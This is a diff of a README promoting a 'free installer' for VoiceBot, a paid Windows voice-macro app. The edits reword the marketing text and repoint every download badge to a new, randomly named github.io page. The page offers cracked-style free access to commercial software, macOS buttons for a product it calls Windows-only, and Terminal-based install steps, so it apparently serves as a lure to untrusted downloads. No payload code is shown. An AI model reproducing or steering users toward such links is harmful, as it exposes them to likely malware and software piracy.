@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-Voice+Control-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-Voice+Macro-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 VoiceBot Free Installer** — VoiceBot is a Windows voice recognition and gaming macro application for controlling games and applications with voice commands. Works without internet access, no account required. Full offline installation.
+**💻 VoiceBot Free Installer** — VoiceBot is a voice command and macro software for Windows that lets you control games, applications, and the desktop using voice recognition. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install VoiceBot](https://img.shields.io/badge/⬇_Install_VoiceBot-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install VoiceBot](https://img.shields.io/badge/⬇_Install_VoiceBot-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About VoiceBot
 
-VoiceBot is a Windows voice recognition and gaming macro application for controlling games and applications with voice commands. Create custom voice profiles for different games, assign spoken commands to keyboard and mouse actions, and control applications hands-free. Popular with gamers who want voice-controlled game actions and accessibility users who need alternative input methods.
+VoiceBot is a voice command and macro software for Windows that lets you control games, applications, and the desktop using voice recognition. It supports custom command profiles for different applications and integrates with popular gaming titles.
 
 ---
 
 ## ❌ Problem: VoiceBot is hard to access
 
-- **Windows Only** — No cross-platform version
-- **Commercial License** — Paid application after trial
-- **Microphone Quality** — Recognition accuracy sensitive to microphone quality and ambient noise
-- **Background Noise** — Noisy environments can trigger unintended commands
+- **Windows Only** — No macOS or Linux version available
+- **Paid License** — Requires subscription for full features
+- **Microphone Quality Sensitive** — Recognition accuracy heavily depends on microphone quality and environment
+- **Always Listening** — Requires constant microphone access which raises privacy concerns
 
 ---
 
@@ -61,9 +61,9 @@ VoiceBot is a Windows voice recognition and gaming macro application for control
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ VoiceBot is a Windows voice recognition and gaming macro application for control
 
 <div align="center">
 
-[![⬇ Install VoiceBot](https://img.shields.io/badge/⬇_Install_VoiceBot-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install VoiceBot](https://img.shields.io/badge/⬇_Install_VoiceBot-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ VoiceBot is a Windows voice recognition and gaming macro application for control
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ VoiceBot is a Windows voice recognition and gaming macro application for control
 
 ---
 
-**VoiceBot Free Installer** — VoiceBot is a Windows voice recognition and gaming macro application for controlling games and applications with voice commands. Install without internet connection today!
+**VoiceBot Free Installer** — VoiceBot is a voice command and macro software for Windows that lets you control games, applications, and the desktop using voice recognition. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install VoiceBot](https://img.shields.io/badge/⬇_Install_VoiceBot-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install VoiceBot](https://img.shields.io/badge/⬇_Install_VoiceBot-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
